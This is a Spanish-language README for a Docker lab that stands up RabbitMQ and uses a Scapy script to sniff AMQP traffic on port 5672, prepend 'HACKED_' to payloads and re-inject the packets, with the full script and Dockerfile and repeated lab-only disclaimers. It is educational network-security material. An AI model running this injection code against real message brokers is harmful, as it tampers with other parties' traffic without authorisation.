
# 🧃🐇 AMQP Packet Chaos con Scapy (SOLO FINES EDUCATIVOS)

🚨 **Disclaimer:**  
Este proyecto es SOLO con fines educativos, para entender cómo interceptar/modificar/inyectar tráfico AMQP usando Scapy. NO lo uses en redes ajenas. No seas bobo: usa entornos de laboratorio.

## 📂 Estructura
```
.
├── docker-compose.yml
├── el_enviador/
│   ├── Dockerfile
│   ├── Insaneador.py
├── el_espameado/
│   ├── Dockerfile
│   ├── Insaneado.py
├── Scapy_scripts/
│   ├── Dockerfile
│   ├── sniffer.py
```
## 🚀 Qué hace
- Levanta RabbitMQ
- Envía/recibe mensajes
- `Scapy_scripts` intercepta paquetes AMQP (5672)
- Modifica payload
- Reinyecta paquetes modificados

## 🧃 sniffer.py
```python
from scapy.all import *
import time

print("🧃 Scapy interceptor ready...")

def packet_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 5672:
        print(f"📦 Original packet: {packet.summary()}")
        if Raw in packet:
            original = packet[Raw].load
            modified = b"HACKED_" + original
            packet[Raw].load = modified
            del packet[IP].chksum
            del packet[TCP].chksum
            send(packet)
            print(f"🚨 Packet modificado e inyectado: {packet.summary()}")

sniff(filter="tcp port 5672", prn=packet_callback, store=0)
```

## 🧃 Dockerfile Scapy_scripts
```dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y tcpdump iproute2 iputils-ping && pip install scapy

WORKDIR /app
COPY sniffer.py .
CMD ["python", "sniffer.py"]
```

## 🧃 Disclaimer
**SOLO LABORATORIO. SOLO PRUEBAS. NO A LAS ILEGALIDADES EXPLOSIVAS.**
